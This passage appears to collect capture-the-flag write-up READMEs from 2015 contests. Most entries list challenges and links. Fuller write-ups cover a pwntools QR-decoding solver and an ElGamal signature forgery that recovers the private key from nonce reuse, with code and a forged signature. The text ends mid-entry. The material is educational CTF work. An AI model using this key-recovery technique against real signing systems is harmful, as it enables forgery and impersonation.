* <https://ctf-team.vulnhub.com/backdoor-ctf-2015-lhc/>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/BACKDOORCTF/misc/lhc>
* [Indonesian](https://docs.google.com/document/d/1zzxRVmmF7rbZp6pWSljbmA6d2yCwIkxkUJFKHSUJiHQ/edit?usp=drive_web)
# backdoor CTF 2015: [QR](https://backdoor.sdslabs.co/challenges/QR)

**Category:** Misc
**Points:** 70
**Author:** [Abhay Bir Singh Rana](https://backdoor.sdslabs.co/users/nemo)
**Difficulty:** Easy
**Solves:** 84
**Description:** 

* <https://backdoor.sdslabs.co/challenges/QR>

> Decode some QR codes at `nc hack.bckdr.in 8010`

## Write-up

by [gb1035](https://github.com/gb1035)

##Overview
When you run
~ nc hack.bckdr.in 8010
You will get back what looks to be a version 10 QR code

At this point there are a couple options to solve this.
I chose a very inefficient route, but it ended up working in the end.

##Netcat
The connection can be opened by using pwn tools tubes.
There are a lot of great methods in the module, we will be using can_recv, recv, and send.

##Qr code:
This is where I went the long way around.
I split the qr code up to an array based on newlines, 
then created a picture 800x800 using PIL, 
then print the text into the image.
You have to use a mono, unicode font in order to represent the qr code correctly.
I selected DejaVuSansMono since it was the first Google result.
Now we have an image of the qr code, we can use qrtools to read it in, and give us text.
Again, complicated, but it worked. most of the time.
Then send the code back to the server which would then give us the next qr code.

##Code Overview (python 2.x):
Use pwntools remote to connect to the server
	
	self.r = remote(hostname, port)
Then we can grab the qr code:

	#get qr-text from server
	data=''
	while self.r.can_recv(timeout = 0.35):
		try:
			data += self.r.recv(timeout=0.01)
		except:
			pass
Now we have the data (unicode text), we need to make it an image.\n
For this, we use PIL to write text to an image.

	im  =  Image.new ( "RGB", (width,height), back_ground_color )	#width,height=800, back_ground_colot = (255,255,255)
	draw  =  ImageDraw.Draw ( im )
	unicode_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf", font_size)	#font_size=10
	vPos=0
	for unicode_text in data:
		draw.text ( (10,vPos), unicode_text.decode('utf-8'), fill=font_color, font=unicode_font )	#font_color=(0,0,0)
		vPos+=10	#font size of 10, so 10 between characters vertically
	im.save("test.png")
This code takes every line from data and prints it as a new line in the image.

Now we have the image saved as test.png, we can use qrtools to read it.

	qr = qrtools.QR()
	qr.decode("test.png")
	print qr.data
This will print the data for the QR code. Now we just need to send it back to the server.

	self.r.send(qr.data)
The server will then give back another qr code to decode

after 100 successful answers, you will not get a qr code,
instead you get back

	Congratulations. Flag is [Redacted]

## Other write-ups and resources

* <http://kbhat95.github.io/backdoor-ctf/>
* <https://ctf-team.vulnhub.com/backdoor-ctf-2015-qr/>
* <https://babyphd.net/2015/04/backdoorctf-writeup/>
* <http://capturetheswag.blogspot.com.au/2015/04/backdoor-ctf-2015-qr-challenge-response.html>
* <https://gist.github.com/Bono-iPad/e908ddc67b3994069950>
* [Indonesian](https://docs.google.com/document/d/12EM1YFzBoGp5jIDtryIof4Jv_p1S1Fvw-6rP8hm9ZlM/edit)
# backdoor CTF 2015: [RAPIDFIRE](https://backdoor.sdslabs.co/challenges/RAPIDFIRE)

**Category:** Misc
**Points:** 500
**Author:** [Amanpreet Singh](https://backdoor.sdslabs.co/users/apsdehal)
**Difficulty:** TODO
**Solves:** 0
**Description:** 

* <https://backdoor.sdslabs.co/challenges/RAPIDFIRE>

> I am enjoying it really. Are you? `nc hack.bckdr.in 8007`. Submit the SHA-256 hash of the flag obtained.

## Write-up

(TODO)

## Other write-ups and resources

* <https://babyphd.net/2015/04/backdoorctf-writeup/>
* <https://github.com/TUCTF/write-ups-2015/tree/master/Backdoorctf15/rapidFire_500>
# backdoorCTF 2015 write-ups

* <https://backdoor.sdslabs.co/>
* [Scoreboard](https://backdoor.sdslabs.co/competitions/backdoorctf15/leaderboard) or [local alternative](scoreboard.txt)
* [Number of solves per task](solves.txt)
* *Please don’t publish actual flags in writeups, since problems will remain available after the contest.*
* [Notes](notes.txt)

## Completed write-ups

* [crypto/rand](crypto/rand)
* [crypto/rsalot](crypto/rsalot)
* [exploit/closed](exploit/closed)
* [exploit/concealed](exploit/concealed)
* [exploit/forgot](exploit/forgot)
* [exploit/noname](exploit/noname)
* [forensics/tim](forensics/tim)
* [misc/lhc](misc/lhc)
* [misc/qr](misc/qr)

## External write-ups only

* [binary/echo](binary/echo)
* [binary/team](binary/team)
* [crypto/bbad](crypto/bbad)
* [crypto/rsanne](crypto/rsanne)
* [misc/rapidfire](misc/rapidfire)
* [web/follow](web/follow)
* [web/jshunt](web/jshunt)
* [web/judge](web/judge)
* [web/medusa](web/medusa)

## Missing write-ups# backdoor CTF 2015: [FOLLOW](https://backdoor.sdslabs.co/challenges/FOLLOW)

**Category:** Web
**Points:** 10
**Author:** [Amanpreet Singh](https://backdoor.sdslabs.co/users/apsdehal)
**Difficulty:** Easy
**Solves:** 194
**Description:** 

* <https://backdoor.sdslabs.co/challenges/FOLLOW>

> Get the first half of flag [@BackdoorCtf](https://twitter.com/BackdoorCTF) and other at #backdoorctf15 on irc.freenode.org. Join them and submit sha-256 of the flag.

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/backdoor-ctf-2015-follow/>
* <https://gist.github.com/Bono-iPad/e908ddc67b3994069950>
* <http://linux.im/2015/04/03/backdoor-ctf-2015-writeup.html#follow--web10>
* [Indonesian](https://docs.google.com/document/d/1iRrG5nO5_xTTB3Aq1BMfeyTVQ2j6iKWW3sZEsGRENqk/edit)
# backdoor CTF 2015: [JSHUNT](https://backdoor.sdslabs.co/challenges/JSHUNT)

**Category:** Web
**Points:** 300
**Author:** [Abhay Bir Singh Rana](https://backdoor.sdslabs.co/users/nemo)
**Difficulty:** TODO
**Solves:**  5
**Description:** 

* <https://backdoor.sdslabs.co/challenges/JSHUNT>

> The html page you create will be visited by the backdoor admin with the flag.
> 
> Test your exploit in Firefox, because that is what the admin is using.
> 
> **Note:** If this feels like a treasure hunt, look at the URL.
> 
> Hunt for the flag at <http://hack.bckdr.in/JSHUNT/>.

## Write-up

(TODO)

## Other write-ups and resources

* <http://anee.me/backdoorctf-2015-jshunt/>
# backdoor CTF 2015: [JUDGE](https://backdoor.sdslabs.co/challenges/JUDGE)

**Category:** Web
**Points:** 150
**Author:** [Amanpreet Singh](https://backdoor.sdslabs.co/users/apsdehal)
**Difficulty:** TODO
**Solves:** 28
**Description:** 

* <https://backdoor.sdslabs.co/challenges/JUDGE>

> Get the flag from [JUDGE](https://hack.bckdr.in/JUDGE). Submit sha-256 of the flag obtained.

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/backdoor-ctf-2015-judge/>
* <http://linux.im/2015/04/03/backdoor-ctf-2015-writeup.html#judge--web150># backdoor CTF 2015: [MEDUSA](https://backdoor.sdslabs.co/challenges/MEDUSA)

**Category:** Web
**Points:** 100
**Author:** [Abhay Bir Singh Rana](https://backdoor.sdslabs.co/users/nemo)
**Difficulty:** TODO
**Solves:** 11
**Description:** 

* <https://backdoor.sdslabs.co/challenges/MEDUSA>

> The html page you create will be visited by the backdoor admin with the flag.
> 
> You can enter a fake flag to simulate the challenge.
> 
> **Update:** The admin will make a POST request to <http://hack.bckdr.in/MEDUSA/view.php?id=ID&flag=FLAG>
> 
> Get the flag at <http://hack.bckdr.in/MEDUSA/>.

## Write-up

(TODO)

## Other write-ups and resources

* <http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-medusa-writeup/>
# BCTF CTF 2015: backdoor

**Category:** Crypto + Programming
**Points:** 600
**Solves:** 1
**Description:** 

> tsh is my favorite backdoor in use. So I forked on github and add some my own functions.
> 
> <https://github.com/zTrix/tsh/commit/f3ef65cbe8a42995ef9c183fb59de2e2d966a8d5>
> 
> I’ve setup a tsh client in cb mode, running at 146.148.60.107 7586, with my secret set, and repeatedly ping some important info out.
> 
> But very weird someone can steal my info, can you steal it?
> 
> You need exploit, crypto, coding, debugging skills, as well as luck and network speed, to solve this challenge.
> 
> tip: flag length less than 22( BCTF{} included)
> 
> tip2: challenge constant in pel.c not modified
> 
> update:
> 
> The server running binary has alarm(3) uncommented in tsh.c. link here: <https://github.com/zTrix/tsh/commit/f3ef65cbe8a42995ef9c183fb59de2e2d966a8d5#diff-245ad4e8eff2c0fa695986cd7e83dff6R177>

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/zTrix/tsh/blob/bctf/solve.py># BCTF CTF 2015: redundant_code

**Category:** Reverse + Crypto
**Points:** 400
**Solves:** 16
**Description:** 

> [http://dl.bctf.cn/redundant-code-34a6b892529238a11b159c1d7f0bf939.tar.xz](redundant-code-34a6b892529238a11b159c1d7f0bf939.tar.xz)
> 
> Xuxu is worrying about how to fill up his disk space with things so that it looks like he didn’t waste money on this 1 TB monster. He found a tool to compress his data with a compression rate of more than 100,000,000%.
> 
> But the problem is, the author of the tool was too lazy to give a decompression program. Please help Xuxu figure out what the hell his original data is.

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/bctf2015/crypto400-redundant_code/writeup.md>
[https://gist.github.com/aluex/7811a2bc37443fc0bf45](https://gist.github.com/aluex/7811a2bc37443fc0bf45)# BCTF CTF 2015: warmup

**Category:** Crypto
**Points:** 50
**Solves:** 86
**Description:** 

> c=0x1e04304936215de8e21965cfca9c245b1a8f38339875d36779c0f123c475bc24d5eef50e7d9ff5830e80c62e8083ec55f27456c80b0ab26546b9aeb8af30e82b650690a2ed7ea407dcd094ab9c9d3d25a93b2140dcebae1814610302896e67f3ae37d108cd029fae6362ea7ac1168974c1a747ec9173799e1107e7a56d783660418ebdf6898d7037cea25867093216c2c702ef3eef71f694a6063f5f0f1179c8a2afe9898ae8dec5bb393cdffa3a52a297cd96d1ea602309ecf47cd009829b44ed3100cf6194510c53c25ca7435f60ce5f4f614cdd2c63756093b848a70aade002d6bc8f316c9e5503f32d39a56193d1d92b697b48f5aa43417631846824b5e86
>
> [http://dl.bctf.cn/warmup-c6aa398e4f3e72bc2ea2742ae528ed79.pub.xz](warmup-c6aa398e4f3e72bc2ea2742ae528ed79.pub.xz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/bctf2015/crypto50-warmup/writeup.md>
* <http://capturetheswag.blogspot.com.au/2015/04/bctf-2015-warmup-crypto-challenge.html>
* [Japanese](http://shiho-elliptic.tumblr.com/post/114389818504/bctf-2015-writeup)# BCTF CTF 2015: weak_enc

**Category:** Crypto
**Points:** 200
**Solves:** 80
**Description:** 

> $ nc 146.148.79.13 8888
>
> [http://dl.bctf.cn/weak_enc-40eb1171f07d8ebb06bbf36849d829a1.py.xz](weak_enc-40eb1171f07d8ebb06bbf36849d829a1.py.xz)
> 
> Decrypt: NxQ1NDMYcDcw53gVHzI7
> 
> The flag for this problem does not look like BCTF{xxxxxx}

## Write-up

(TODO)

## Other write-ups and resources

* <http://capturetheswag.blogspot.com.au/2015/03/bctf-2015-weakenc-crypto-challenge.html>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/BCTF/crypto/weak_enc>
* <https://github.com/pwning/public-writeup/blob/master/bctf2015/crypto200-weak_enc/writeup.md># BCTF CTF 2015: drunk

**Category:** Exploit
**Points:** 300
**Solves:** 8
**Description:** 

> $ nc 146.148.79.13 55173
>
> [http://dl.bctf.cn/drunk-fd578ec1b5ef499892694807827d2805.exe.xz](drunk-fd578ec1b5ef499892694807827d2805.exe.xz)
> 
> tips: no brute-force required, it's solvable, enjoy hacking!

## Write-up

(TODO)

## Other write-ups and resources

* <https://rzhou.org/~ricky/bctf2015/drunk/>
* <https://github.com/pwning/public-writeup/blob/master/bctf2015/pwn300-drunk/test.py># BCTF CTF 2015: pattern

**Category:** Exploit
**Points:** 600
**Solves:** 6
**Description:** 

> God helped me fix the bug.
> 
> nc 146.148.60.107 6665
>
> [http://dl.bctf.cn/pattern-29123faa33d7d85163c7165ea6bd1662.xz](pattern-29123faa33d7d85163c7165ea6bd1662.xz)
> 
> [http://dl.bctf.cn/libs-665b53481cc332132152f63f4aeed3fc.tar.gz](libs-665b53481cc332132152f63f4aeed3fc.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/bctf2015/pwn600-pattern/writeup.md>
* [Chinese](https://dl.bctf.cn/217-8b28f67bf657e73bdfd815a8558a901d.html#pattern)
* <https://gist.github.com/Idolf/32059d0c5c31f2ae1738># BCTF CTF 2015: qoobee

**Category:** Exploit
**Points:** 500
**Solves:** 3
**Description:** 

> $ nc 104.197.7.111 1002
>
> [http://dl.bctf.cn/qoobee-a53284060b93371c32322f8a522db98d.xz](qoobee-a53284060b93371c32322f8a522db98d.xz)
> 
> update: libc file can be downloaded [here](libc.so.6), md5sum = 3f6aaa980b58f7c7590dee12d731e099

## Write-up

(TODO)

## Other write-ups and resources

* <https://rzhou.org/~ricky/bctf2015/qoobee/>
* <https://github.com/pwning/public-writeup/blob/master/bctf2015/pwn500-qoobee/test.py># BCTF CTF 2015: zhongguancun

**Category:** Exploit
**Points:** 450
**Solves:** 17
**Description:** 

> $ nc 146.148.60.107 6666
>
> [http://dl.bctf.cn/zhongguancun-47a25f85cc5221071886cc129046e6e4.xz](zhongguancun-47a25f85cc5221071886cc129046e6e4.xz)
> 
> [http://dl.bctf.cn/libs-665b53481cc332132152f63f4aeed3fc.tar.gz](libs-665b53481cc332132152f63f4aeed3fc.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* <http://barrebas.github.io/blog/2015/03/23/after-the-fact-bctf-zhong-guan-cun-writeup/>
* <https://github.com/pwning/public-writeup/blob/master/bctf2015/pwn450-zhongguancun/writeup.md>
* [Chinese](https://dl.bctf.cn/217-8b28f67bf657e73bdfd815a8558a901d.html#zhongguancun)
* [Chinese](http://rk700.github.io/writeup/2015/03/25/bctf-writeup/)
* <https://gist.github.com/Idolf/99ffa3c5f76165f77b19># BCTF CTF 2015: broken_oj

**Category:** Misc + Reverse
**Points:** 300
**Solves:** 4
**Description:** 

> Your friend Jeorge built another online judge. Apparently he heard of Hidanang's story and hardening his OJ a lot. But… http://146.148.79.13:31338/
> 
> Note: Flag is located somewhere in /home/, readable by everyone.
> 
> [http://dl.bctf.cn/broken_oj-fb0edb7a73008358ffa30241ac06994d.xz](broken_oj-fb0edb7a73008358ffa30241ac06994d.xz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://www.reddit.com/r/netsec/comments/3003hk/bctf_2015_writeups/cppu4zb># BCTF CTF 2015: experiment

**Category:** Programming
**Points:** 300
**Solves:** 28
**Description:** 

> Hi, we have a short survey with 50 questions. You can get a flag as award once you finished it.
> 
> $ nc 104.197.7.111 13135

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/bctf2015/prog300-experiment/writeup.md>
* [Japanese](http://xrekkusu.hatenablog.jp/entry/2015/03/23/144118)# BCTF CTF write-ups

* <http://bctf.cn/>
* [Scoreboard](http://bctf.cn/#/rank) or [local alternative](scoreboard.txt)
* [Number of solves per task](solves.txt)

## Completed write-ups

* [survey/survey](survey/survey)

## External write-ups only

* [crypto/backdoor](crypto/backdoor)
* [crypto/redundant-code](crypto/redundant-code)
* [crypto/warmup](crypto/warmup)
* [crypto/weak-enc](crypto/weak-enc)
* [exploit/drunk](exploit/drunk)
* [exploit/pattern](exploit/pattern)
* [exploit/qoobee](exploit/qoobee)
* [exploit/zhongguancun](exploit/zhongguancun)
* [misc/broken-oj](misc/broken-oj)
* [programming/experiment](programming/experiment)
* [reverse/camlmaze](reverse/camlmaze)
* [reverse/freak](reverse/freak)
* [reverse/securecom](reverse/securecom)
* [trivial/checkin](trivial/checkin)
* [web/sqli-engine](web/sqli-engine)
* [web/torrent-lover](web/torrent-lover)
* [web/webchat](web/webchat)

## Missing write-ups

* [reverse/crappy_oj](reverse/crappy_oj)# BCTF CTF 2015: camlmaze

**Category:** Reverse
**Points:** 450
**Solves:** 4
**Description:** 

> [http://dl.bctf.cn/camlmaze-dc58e8c06ba86094c848ce4d42ada1a7.tgz](camlmaze-dc58e8c06ba86094c848ce4d42ada1a7.tgz)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/bctf2015/rev450-camlmaze/writeup.md>
* [Applicable PoC](https://github.com/MaskRay/BCTF2015-CamlMaze/blob/master/poc.rb)
* [Chinese analysis](http://maskray.me/blog/2015-03-23-bctf-2015-camlmaze)# BCTF CTF 2015: crappy_oj

**Category:** Misc + Reverse
**Points:** 200
**Solves:** 4
**Description:** 

> Your enemy Hidanang just wrote an online judge for ACM-ICPC style problems and released an impossible challenge, now solve it.
> 
> http://146.148.79.13:9284
> 
> [http://dl.bctf.cn/crappy_oj-9e1d1c5778aa7c7749ed067d1a876f5c.xz](crappy_oj-9e1d1c5778aa7c7749ed067d1a876f5c.xz)

## Write-up

(TODO)

## Other write-ups and resources

* none yet# BCTF CTF 2015: freak

**Category:** Reversing
**Points:** 250
**Solves:** 12
**Description:** 

> [NEW download](freak.v1-d4bc8c1a0926dc0ef30a63859fe3b52a.exe.xz)
> 
> updated:
> 
> new binary uploaded.
> 
> There was some bug in this problem, we have fixed it, do it now:)

## Write-up

(TODO)

## Other write-ups and resources

* <http://cregnec.github.io/blog/2015/03/23/bctf-freak-writeup.html>
* <https://github.com/pwning/public-writeup/blob/master/bctf2015/rev250-freak/writeup.md># BCTF CTF 2015: securecom

**Category:** Reverse
**Points:** 100
**Solves:** 32
**Description:** 

> [http://dl.bctf.cn/securecom-0d5cf2f5ba89d8e5725787be5482ac37.tar.xz](securecom-0d5cf2f5ba89d8e5725787be5482ac37.tar.xz)

## Write-up

(TODO)

## Other write-ups and resources

* <http://wiremask.eu/bctf-2015-securecom/>
* <https://github.com/pwning/public-writeup/blob/master/bctf2015/rev100-securecom/writeup.md># BCTF CTF 2015: survey

**Category:** Survey
**Points:** 10
**Solves:** 60
**Description:**

> finish the survey to help BCTF be better!
>
> <https://docs.google.com/forms/d/1cQX0GQMwUk4TRVP12Ur1AqQ7LLwmbyuo04jYZT0GPQM/viewform>

## Write-up

The flag is BCTF{thank_you_for_participating_in_BCTF}

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/bctf2015/misc.md>
# BCTF CTF 2015: checkin

**Category:** Trivial
**Points:** 10
**Solves:** 567
**Description:** 

> Please checkin at IRC

## Write-up

(TODO)

## Other write-ups and resources

* <http://linux.im/2015/03/23/BCTF-WEB-Writeup.html#checkin-10>
* <https://github.com/pwning/public-writeup/blob/master/bctf2015/misc.md># BCTF CTF 2015: sqli_engine

**Category:** Web
**Points:** 200
**Solves:** 123
**Description:** 

> http://104.197.7.111:8080/
> 
> geohot told me he has a lot of sql injection tricks. So I wrote a sql injection detection engine in defense.
> 
> Now you have a simple website protected by my engine, try to steal the admin’s password(not hash).
> 
> form = web.input()
> 
> username = form.get('username')
> password = form.get('password')
> 
> if sqliengine.is_sqli(username):
>     raise web.BadRequest(u'username contains SQL injection, IP recorded.')
> 
> if sqliengine.is_sqli(password):
>     raise web.BadRequest(u'password contains SQL injection, IP recorded')
> 
> if sqliengine.is_sqli(username + password):
>     raise web.BadRequest(u'username + password contains SQL injection, IP recorded')
> 
> \# continue normal db operation
> There are only two pages: login and register, please do not use web scanner to brute force, just do the sqli part.

## Write-up

(TODO)

## Other write-ups and resources

* <http://linux.im/2015/03/23/BCTF-WEB-Writeup.html#sqlienginescore-200>
* <https://rzhou.org/~ricky/bctf2015/sqli_engine/>
* <https://github.com/pwning/public-writeup/blob/master/bctf2015/web200-sqli_engine/test.py>
* <http://pastebin.com/5exPuAFR># BCTF CTF 2015: torrent_lover

**Category:** Web
**Points:** 233
**Solves:** 65
**Description:** 

> A dog loves torrent.
> 
> <http://218.2.197.253/index.php>

## Write-up

(TODO)

## Other write-ups and resources

* <http://linux.im/2015/03/23/BCTF-WEB-Writeup.html#torrentloverscore-233>
* <https://github.com/pwning/public-writeup/blob/master/bctf2015/web_233-torrent_lover/writeup.md>
* [Japanese](http://shiho-elliptic.tumblr.com/post/114389818504/bctf-2015-writeup)# BCTF CTF 2015: webchat

**Category:** Web
**Points:** 325
**Solves:** 64
**Description:** 

> http://146.148.60.107:9991/

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/DavidDeLille/writeups/tree/master/bctf_2015/webchat>
* <http://linux.im/2015/03/23/BCTF-WEB-Writeup.html#webchat-325>
* <https://rzhou.org/~ricky/bctf2015/webchat/>
* <https://github.com/pwning/public-writeup/blob/master/bctf2015/web325-webchat/sol.txt># Boston Key Party CTF 2015: Airport

**Category:** Cryptography
**Points:** 500
**Solves:** 33
**Description:**

> The timing in this challenge is clearly not very realistic---but the methods you'll use here can be extended to real-world implementations of modular exponentiation. Server at 52.1.245.61 bostonkeyparty.net , port 1025. My solution takes a little while. Good luck. : 500

## Write-up

(TODO)

## Other write-ups and resources

* [H4x0rPsch0rr](http://hxp.io/blog/11/BkP%20CTF%202015:%20crypto500%20%22Airport%22/)
* <http://tasteless.eu/2015/03/boston-key-part-2015-airport-crypto-500/>
* <https://kitctf.de/writeups/bkp2015/airport/>
* <https://github.com/pwning/public-writeup/blob/master/bkp2015/crypto500-airport/writeup.md>
* <https://neg9.org/news/2015/3/8/boston-key-party-2015-airport-crypto-500-writeup>
# Boston Key Party CTF 2015: Bowdoin

**Category:** Cryptography
**Points:** 350
**Solves:** 34
**Description:**

> You just found this 1024bit RSA key laying on the tracks. It seems to be damaged by trains and the rain. Can you still manage to use it to decrypt the flag.encrypted file? : 350

## Write-up

(TODO)

## Other write-ups and resources

* <http://gnoobz.com/bkpctf-2015-bowdoin-writeup.html># Boston Key Party CTF 2015: Orient Heights

**Category:** Cryptography
**Points:** 250
**Solves:** 47
**Description:**

> You have a bunch of signatures. Sign the right message and get the key. Obviously, don't use one of the signatures I gave you---that still won't work. Have fun! 52.0.34.80, port 45256. : 250

## Write-up

(TODO)

## Other write-ups and resources

* <http://r3dey3.com/2015-03/bkpctf-wood-island-and-orient-heights/>
* <https://github.com/pwning/public-writeup/blob/master/bkp2015/crypto250-orientheights/writeup.md>
* [Indonesian](http://blog.rentjong.net/2015/03/boston-key-party-2015-orient-heights.html)# Boston Key Party CTF 2015: Wonderland

**Category:** Cryptography
**Points:** 600
**Solves:** 10
**Description:**

> Server is running at 54.86.168.156, port 40638. Find the flag! (UPDATE---there was a very, very slight change to server.py . Redownload to see it.) : 600

## Write-up

(TODO)

## Other write-ups and resources

* [H4x0rPsch0rr](http://hxp.io/blog/12/BkP%20CTF%202015:%20Crypto%20600%20"Wonderland"%20writeup/)
* <https://github.com/pwning/public-writeup/blob/master/bkp2015/crypto600-wonderland/writeup.md>
# Boston Key Party CTF 2015: Wood Island

**Category:** Cryptography
**Points:** 150
**Solves:** 90
**Description:**

> You can try to sign messages and send them to the server, 52.0.217.48 port 60231. Sign the right message and you'll get the flag! Only problem---you don't have the signing key. I will give you this, though: sigs.txt is a file containing a bunch of signatures. I hope it helps. (P.S. Don't try and send the exact signatures in that file---that's cheating!) : 150

## Write-up

by [epochfail](https://github.com/epochfailctf)

The task was to forge an ElGamal signature of a fixed string, given a collection of signatures. We are also provided with the prime, `p`, and generator element `g`: the public parameters of an ElGamal signing system.

The server reads the signed message as a tuple, `(r, s, m)`, verifying that the signature is valid and not one of the provided strings. If the message checks out (`m == "There is no need to be upset"`), it will send the flag.

#### Analysis

From Wikipedia, we know that ElGamal signature values are constructed from a private key, `x`, and a randomly chosen number, `k`. Then, the `r` value is simply `r := g**k (mod p)`. It also mentions that, if `k` is reused, the signature scheme can be broken with a pair of signatures using the same `k`. This is the case with signatures we have been given: some values of `r`, and therefore `k`, are reused:

```
~/ctf/bkpctf/wood-island $ grep -o '"r": [^,]*' sigs.txt  | sort | uniq -dc
      2 "r": 1559657422442360433717...  # Truncated for brevity
      2 "r": 2403055148312205362471...
      2 "r": 7642569978590436429035...
```

In theory, this is enough to break the signature scheme. But, turns out that two of these signatures are invalid. Consulting with the author...

    <gsilvis> I didn't say they were CORRECT signatures :)

And so we use `elgamal_verify()` from the provided `dsa.py` to filter out invalid tuples. In the end, the tuple with `15596...` remains, and this is our attack vector.

#### Actually solving

From Wikipedia, we know that a signature is correct iff `H(m) = xr + sk (mod p-1)`. Since we have two examples with known `(r, s, m)` and equal `k`, we get a system of equations:

```
H(m_1) = x * r_1 + s_1 * k (mod p-1)
H(m_2) = x * r_2 + s_2 * k (mod p-1)
```
with only `x` and `k` unknown. Solving these for `k`, we note that there is a shared factor of 2 between the modulus and the values we need to invert. Not a problem: we just solve it modulo (p-1)/2, making sure to check both solutions:
```python
# Assume m1, m2 have been hashed and modded.
half = (p - 1) / 2
k = (modinv(s1 - s2, half) * (m1 - m2)) % (p - 1)
assert r1 % p == pow(g, k, p)  # Fails
assert r1 % p == pow(g, k + half, p)  # Succeeds
k += half  # Use this one.
```

Now we can solve it for `x`, the private key:
```python
# We have m1 = x*r + k*s1, thus:
xr = (m1 - k * s1) % (p-1)
# Again, account for shared factor of 2:
x = modinv(r1 / 2, half) * (xr / 2)
x += half
x %= p-1
```

We now construct a correct signature:
```python
k = 3  # Use a different k
r = pow(g, k, p)
m = int(hashlib.sha384("There is no need to be upset").hexdigest(), 16)
s = ((m - x * r) * modinv(k, p - 1)) % (p-1)
assert s != 0, 'Pick a different k'
assert elgamal_verify(r, s, "There is no need to be upset")  # Passes
```

The full signature is thus:
```python
{"s": 3014878633137287394124127653489873288159630923151976475367110860665823037637967007108548419033983397235634088548630635608460601426846110437988798187839907543732012712339535128402199579515311964117424119775352438560229969973347567270238554852248811372675535769778593411780705689239120513635405191218285465254686432764036553625872828345641530781048387734401408069865444002089832141092673760743216330502251238391118869141618294878380090970580806911379005579922080899099717770415409502899325918107535114908790355754386169519151299225168135323147286722969796080575358595404216685633122420151399732715276797035035494161809, "r": 125, "m": "There is no need to be upset"}
```

## Alternative write-up

by [mrexcessive](https://github.com/mrexcessive)

There also was an exploitable bug in the server code, it didn't check the contents of the hash sufficiently - sneaking in an extra key/value pair meant that the elgamal_verify() could be used with one of the supplied triplets.

This challenge was also breakable by exploiting a bug in the server code dsa.py
After getting through the proof/not a robot... step...
You then need to provide a JSON format representation of a hash containing valid r,s,m vals

You can use the entire line with 'm' value "There is no need to be upset" from the supplied sigs.txt file

But... surely this will fail the is_duplicate(sig) test ?
Not if you insert an extra entry into the hash...
See [this code](WoodIsland_try.py) for an example.

Glad of that - 'cos exploit easier than the mathematics!

## Other write-ups and resources

* <http://r3dey3.com/2015-03/bkpctf-wood-island-and-orient-heights/>
* <https://ctfcrew.org/writeup/98>
* [Japanese](http://math314.hateblo.jp/entry/2015/03/02/025356)
* [Indonesian](http://blog.rentjong.net/2015/03/boston-key-party-2015-wood-island.html)
# Boston Key Party CTF 2015: Alewife

**Category:** Pwning
**Points:** 400
**Solves:** 38
**Description:**

> alewife.bostonkey.party 8888 : 400

## Write-up

(TODO)

## Other write-ups and resources

* <https://rzhou.org/~ricky/bkpctf2015/alewife/>
* <http://r3dey3.com/2015-03/bkpctf-alewife/>
* <https://github.com/kitctf/writeups/blob/master/bkp2015/alewife/pwn.py>
* <https://github.com/pwning/public-writeup/blob/master/bkp2015/pwn400-alewife/writeup.md>
* <https://b01lers.net/challenges/Boston%20Key%20Party%202015/Alewife/43/>
* <https://gist.github.com/g05u/4126f452ee41d4d5328c># Boston Key Party CTF 2015: Andrew

**Category:** Pwning
**Points:** 275
**Solves:** 50
**Description:**

> we have an EXPERIMENTAL CDN based on nginx. It can optimize html, javascript, leetify text and rehost images. It is up at http://54.88.83.98:8080/ flag is in /flag.txt : 275

## Write-up

(TODO)

## Other write-ups and resources

* [H4x0rPsch0rr](http://hxp.io/blog/14/Boston%20Key%20Party%20CTF%202015%20-%20pwn%20275:%20Andrew/)
* [Chinese](http://blog.orange.tw/2015/03/boston-key-parcty-ctf-2015-harvard.html)
# Boston Key Party CTF 2015: Braintree

**Category:** Pwning
**Points:** 300
**Solves:** 6
**Description:**

> The MBTA wrote a cool system. It's pretty bad though, sometimes the commands work, sometimes they don't... Exploit it. (tz flag) 54.165.91.92 8899 : 300

## Write-up

(TODO)

## Other write-ups and resources

* <https://www.bpak.org/blog/2015/03/bkpctf-2015-braintree-tz-write-up/>
* <https://rzhou.org/~ricky/bkpctf2015/zenhv/>
# Boston Key Party CTF 2015: Broadway

**Category:** Pwning
**Points:** 275
**Solves:** 26
**Description:**

> lets pretend that first CDN didnt happened! can you get a shell, there is a second flag in the root of the fs! It is up at http://54.88.83.98:8080/ : 275

## Write-up

(TODO)

## Other write-ups and resources

* [H4x0rPsch0rr](http://hxp.io/blog/15/Boston%20Key%20Party%202015%20-%20pwn%20275:%20Broadway/)
* [Chinese](http://blog.orange.tw/2015/03/boston-key-parcty-ctf-2015-harvard.html)
# Boston Key Party CTF 2015: Central Square

**Category:** Pwning
**Points:** 200
**Solves:** 40
**Description:**

> Check out our new filter! : 200

## Write-up

(TODO)

## Other write-ups and resources

* <https://mivehind.net/2015/03/06/bkpctf-2015/>
* <http://pastebin.com/SYcrZp7y>
* <http://pastebin.com/efCH07Ni>
# Boston Key Party CTF 2015: Harvard Square

**Category:** Pwning
**Points:** 275
**Solves:** 16
**Description:**

> can you be a leet 0day broker? 52.1.91.215 2114 (libc is ubuntu adf3305fcd0345f706019cf94687d50b libc-2.19.so) : 275

## Write-up

by [0xddaa](https://github.com/0xddaa)

The problem is a game about transcation of 0days.  
We can enter the password and cheat the game, but it's useless.   
The game print the message:  

>Welcome to 0day Warz - The goal of the game is to get the $100M USD by the end of the game. You have been given a loan of $2000, with some high interest rate of 25% a day!`

The programe for the goal of game:  
```
void play_game() {
    ...
